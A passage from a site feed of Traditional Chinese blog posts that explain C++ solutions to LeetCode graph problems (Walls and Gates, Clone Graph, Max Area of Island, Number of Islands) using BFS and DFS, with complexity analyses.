class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">wallsAndGates</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; rooms)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m= rooms.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n= rooms[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(rooms[i][j]== <span class="number">0</span> )&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;i,j&#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; current = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">4</span>; k++)&#123;</span><br><span class="line">                <span class="type">int</span> subRow = current.first + offsetRow[k];</span><br><span class="line">                <span class="type">int</span> subCol = current.second + offsetCol[k];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(subRow &gt;= <span class="number">0</span> &amp;&amp; subRow &lt; m &amp;&amp; subCol &gt;=<span class="number">0</span> &amp;&amp; subCol &lt; n  &amp;&amp; rooms[subRow][subCol] == INT_MAX )&#123;</span><br><span class="line">                    rooms[subRow][subCol] = rooms[current.first][current.second] +<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;subRow,subCol&#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡其實也是經典的 Graph BFS 的走訪方式，這裡先將符合資格的 vertex (<code>rooms[i][j]==0</code>)，也就是閘門推入 Queue </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(rooms[i][j]== <span class="number">0</span> )&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123;i,j&#125;);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著逐一將queue中元素取出作為搜尋起點，每個搜尋起點都需要查看他的上下左右四個方位的格子是否是空房間 (<code>rooms[subRow][subCol] == INT_MAX</code>)，如果是空房間的話就去將其添入距離，而上下做有格子一定是距離當前格子 <code>1</code> 單位的距離，因此 <code>rooms[subRow][subCol] = rooms[current.furst][current.second] + 1</code> ， 並且後續也需要將其作為新的搜尋起點，所以需要繼續推入 queue (<code>q.push(&#123;i,j&#125;)</code>)。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/286/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(m \times n)$ &#x3D; $O(m \times n)$ + $O(m \times n)$ </p><p>$m \times n$ 為 <code>rooms</code> 大小， 另外最壞狀況下 queue中可能會有 $m \times n$ 個節點要處理，因此整體複雜度為 $O(m \times n)$</p><p>空間複雜度</p><p>$O(m \times n)$ queue 最糟糕狀況可能同時儲存 $m \times n$ 個節點</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> BFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>複製圖 | Medium | LeetCode#133. Clone Graph</title>
      <link href="/posts/8d1c6ed0.html"/>
      <url>/posts/8d1c6ed0.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/133/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定了一個 connected undirect graph 中節點的參考設計，希望你回傳這個 graph 的 <a href="https://en.wikipedia.org/wiki/Object_copying#Deep_copy">Deep Copy</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">    public int val;</span><br><span class="line">    public List&lt;Node&gt; neighbors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其實看到 Deep Copy 就可以想的是要用 Hash Table 了</p></blockquote><div class="note info flat"><p>這題還有說明，這題節點的 index 與節點的 value 相同，也就是第一個節點的 <code>val</code> 就會是 <code>1</code> ，而第二個節點的 <code>val</code> 就會是 <code>2</code> 以此類推。 然後題目會給定一個 adjacency list 這個 list 中的每個 sublist 都描述了個別節點與其他節點的相鄰狀況，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adjList = [[2,4],[1,3],[2,4],[1,3]]</span><br></pre></td></tr></table></figure><p>這代表第ㄧ個節點 (<code>index=0</code>) 的鄰接節點有 <code>val==2</code> 以及 <code>val==4</code> 的節點。 而這代表第二個節點 (<code>index=1</code>) 的鄰接節點有 <code>val==1</code> 以及 <code>val==3</code> 的節點，以此類推。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法就是要透過 hash table 紀錄原先節點以及新節點之間的對應關係，邏輯會有點像是這題 <a href="https://leozzmc.github.io/posts/28674f4b.html">LeetCode#138. Copy List with Random Pointer</a>，透過建立節點的 hash table 可以輕易的進行 deep copy。所以為了要將節點保存到 Hash Table 需要先對 Graph 進行 Traversal。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    vector&lt;Node*&gt; neighbors;</span></span><br><span class="line"><span class="comment">    Node() &#123;</span></span><br><span class="line"><span class="comment">        val = 0;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = vector&lt;Node*&gt;();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    Node(int _val, vector&lt;Node*&gt; _neighbors) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        neighbors = _neighbors;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">cloneGraph</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step1: BFS traveral for constructing an map</span></span><br><span class="line">        unordered_map&lt;Node*, Node*&gt; nodeMap;</span><br><span class="line">        queue&lt;Node*&gt; nodeToVisit;</span><br><span class="line">        nodeToVisit.<span class="built_in">push</span>(node);</span><br><span class="line">        </span><br><span class="line">        nodeMap[node] = <span class="keyword">new</span> <span class="built_in">Node</span>(node-&gt;val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!nodeToVisit.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            Node* current = nodeToVisit.<span class="built_in">front</span>();</span><br><span class="line">            nodeToVisit.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(Node* n : current-&gt;neighbors)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nodeMap.<span class="built_in">find</span>(n) == nodeMap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                    nodeMap[n] = <span class="keyword">new</span> <span class="built_in">Node</span>(n-&gt;val);</span><br><span class="line">                    nodeToVisit.<span class="built_in">push</span>(n);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Update the adjlist of current node to the corresponding new nodes</span></span><br><span class="line">                nodeMap[current]-&gt;neighbors.<span class="built_in">push_back</span>(nodeMap[n]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Step2: Recreate new nodes from the map</span></span><br><span class="line">        <span class="keyword">return</span> nodeMap[node];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡首先先宣告 Hash Table  <code>unordered_map&lt;Node*, Node*&gt; nodeMap</code> 以及用於進行 BFS 的 queue <code>nodeToVisit</code>，接著就會將初始節點 <code>node</code> push 進 queue 中，並且將其保存於 hash table 中，這一步驟同時會在 <code>node</code> 這個 key 對應到新建立的節點，並且該節點具有與 <code>node</code> 相同的節點值 （<code>nodeMap[node] =  new Node(node-&gt;val)</code>）。</p><p>接著就能夠進行 BFS Traversal，當 queue 未空時，取出 front 節點作為當前的搜尋起點，接折會去迭代 <code>current</code> 的 adjacency list <code>neighbors</code> 若在 <code>nodeMap</code> 中沒有找到該節點為 key 的 entry 則這時會去新增一筆 entry，並且會把該節點 push 進入queue 中作為之後的搜尋起點。接著就是要把 <code>current</code> 所有的鄰接節點都更新到 <code>nodeMap[current]</code> (也就是對應的新節點) 的 adjacency list (<code>nodeMap[current]-&gt;neighbors.push_back(nodeMap[n]);</code>)</p><p>函數的最後回傳任意新節點。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/133/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(N+ E)$：使用 queue 進行 BFS 遍歷，每個節點被訪問一次，每條邊也被處理一次，$N$ 為圖中節點數量，而 $E$ 為邊的數量</p><p>空間複雜度</p><p>$O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>島的最大面積 | Medium | LeetCode#695. Max Area of Island</title>
      <link href="/posts/6c6d3ce.html"/>
      <url>/posts/6c6d3ce.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/695/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：  題目給定一個 m x n 大小的二元陣列 <code>grid</code>，陣列中 <code>1</code> 代表陸地，<code>0</code> 代表水域，島嶼四面環水，相鄰的陸地會水平或垂直地連接而成，請回傳陣列中島嶼的最大面積，如果沒有島嶼則回傳 0</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題算是接續 <a href="https://leozzmc.github.io/posts/b7e69c9.html">LeetCode#200. Number of Islands</a> 所以我的解題策略會基於這題，就是一樣先透過 DFS 找到 Connected Components 然後這裡累加Connected Components 的面積，再比較最大面積。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; visited; </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid, <span class="type">int</span> row, <span class="type">int</span> col)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(row &lt; <span class="number">0</span> || row &gt;= grid.<span class="built_in">size</span>() || col &lt; <span class="number">0</span> || col &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || visited[row][col] == <span class="number">1</span> || grid[row][col] == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        visited[row][col] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">4</span>; k++)&#123;</span><br><span class="line">            sum += <span class="built_in">dfs</span>(grid, row+offsetRow[k], col+offsetCol[k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        visited.<span class="built_in">resize</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        <span class="type">int</span>  maxIslandArea = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]==<span class="number">1</span> &amp;&amp; visited[i][j] ==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> currentArea = <span class="built_in">dfs</span>(grid, i,j);</span><br><span class="line">                    maxIslandArea = <span class="built_in">max</span>(maxIslandArea, currentArea );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxIslandArea;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這題一樣先在 <code>maxAreaOfIsland</code> 函數去初始化一個用於保存是否走訪過的2D Vector <code>visited</code> 並且都初始化為 0 (<code>0</code>: unvisited,<code>1</code>: visited)，接著需要迭代 <code>grid</code>，一旦發現當前網格會是小島 (<code>grid[i][j]==1</code>) 並且並未造訪過 (<code>visited[i][j]==0</code>) 這時候就會去進行 <code>dfs</code> 而回傳結果會是該格相連島嶼的總面積 (connected components 面積)，這時會去與先前的最大面積 <code>maxIslandArea</code> 進行比較，保留大的。</p><p>在 <code>dfs</code> 部分，因為會是遞迴進行，因此需要先定義終止條件，這裏的條件不外就是超出 <code>grid</code> 範圍，還有網格已經造訪過，以及跑到水中 (<code>grid[row][col]==0</code>) 。而每一層遞迴中，會去將 <code>visited[row][col]</code> 更新成已造訪 (<code>1</code>)，接著需要遞迴判斷當前這一格的上下左右是否一樣是島嶼</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dfs</span>(row+<span class="number">1</span>,col);</span><br><span class="line"><span class="built_in">dfs</span>(row, col+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">dfs</span>(row<span class="number">-1</span>, col);</span><br><span class="line"><span class="built_in">dfs</span>(row, col<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><p>而每個結果都需要更新到 <code>sum</code> 中，最後回傳 <code>sum</code>。因為不想寫四遍，所以定了一個迴圈來處理。回到 <code>maxAreaOfIsland</code> 後，迭代完 <code>grid</code> 後回傳 <code>maxIslandArea</code> 就會是最大面積。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/695/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度： $O(mn)$</p><p>空間複雜度： $O(mn)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
            <tag> Matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>島的數量 | Medium | LeetCode#200. Number of Islands</title>
      <link href="/posts/b7e69c9.html"/>
      <url>/posts/b7e69c9.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/200/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定一個 m x n 大小的二元陣列 <code>grid</code>，陣列中 <code>1</code> 代表陸地，<code>0</code> 代表水域，請回傳島嶼的數量。島嶼四面環水，相鄰的陸地會水平或垂直地連接而成。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這裡的想法就是這應該其實要找的是 <strong>這個 Grid 中的所有 connected components 的數量</strong> ， 這可以透過對所有尚未訪問節點進行 BFS 或 DFS 並透過一個 counter 來紀錄就可實現。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> row, col;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; visited; <span class="comment">//0:unvisited, 1:visited</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> r, <span class="type">int</span> c, vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(r&lt;<span class="number">0</span> || r&gt;= grid.<span class="built_in">size</span>() || c &lt;<span class="number">0</span> || c&gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[r][c]==<span class="string">&#x27;0&#x27;</span> || visited[r][c]==<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        visited[r][c] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(r+<span class="number">1</span>,c, grid);</span><br><span class="line">        <span class="built_in">dfs</span>(r<span class="number">-1</span>,c, grid);</span><br><span class="line">        <span class="built_in">dfs</span>(r,c+<span class="number">1</span>, grid);</span><br><span class="line">        <span class="built_in">dfs</span>(r,c<span class="number">-1</span>, grid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numIslands</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        row = grid.<span class="built_in">size</span>();</span><br><span class="line">        col = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        visited.<span class="built_in">resize</span>(row, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col,<span class="number">0</span>));</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;row; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;col; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]==<span class="string">&#x27;1&#x27;</span> &amp;&amp; visited[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">dfs</span>(i,j,grid);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我這裡的主要透過 DFS 來進行走訪，首先對於這題會需要先定義幾個變數來進行記錄：</p><ul><li><code>int row, col</code> 主要用於記錄目前走訪到 <code>grid</code> 的哪一格</li><li><code>vector&lt;vector&lt;int&gt;&gt; visited</code> 用於記錄此格是否拜訪過，<code>0</code> 代表尚未拜訪，<code>1</code> 代表已拜訪</li></ul><p>接著回到函數 <code>numIslands</code>，首先需要初始化 <code>visited</code> 大小，大小要跟 <code>grid</code> 一樣, 這裏透過兩個變數 (<code>row</code>, <code>col</code>)來保存行跟列長度，接著要宣告一個變數 <code>count</code> 用於保存島的數量。 接著我們需要透過一個迴圈來迭代每一格，若每一格中的值為 <code>1</code> 並且是尚未造訪過的 <code>visited[i][j] == 0</code> ，這時就需要去遞迴查看跟他相連的節點是否有其他是島嶼，而每次遞迴結束回到 <code>numIslands</code> 就代表找到一個 connected components，這時 <code>count</code> 就可以累加。</p><p>這裏的 <code>dfs</code> 跟Tree的 <code>dfs</code> 很像，一樣要去設定終止條件，這裏的終止條件就是：(1)超出範圍 (2)碰到 <code>0</code> 跟 (3)已經造訪過 就會返回。還沒遇到終止條件前，需要先將節點標注為「已造訪」(<code>visited[r][c] =1</code>) 接著就會去遞迴查找其上下左右鄰接節點是一樣是島嶼。一旦在 <code>numsIslands</code> 都查找完畢後，就會回傳所記錄的 connected components 的數量。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/200/result.jpeg"></p><h2 id="BFS-作法"><a href="#BFS-作法" class="headerlink" title="BFS 作法"></a>BFS 作法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> row, col;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; visited;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numIslands</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        row = grid.<span class="built_in">size</span>();</span><br><span class="line">        col = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;; </span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;; </span><br><span class="line">        visited.<span class="built_in">resize</span>(row, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col,<span class="number">0</span>));</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;row; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;col; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(visited[i][j] == <span 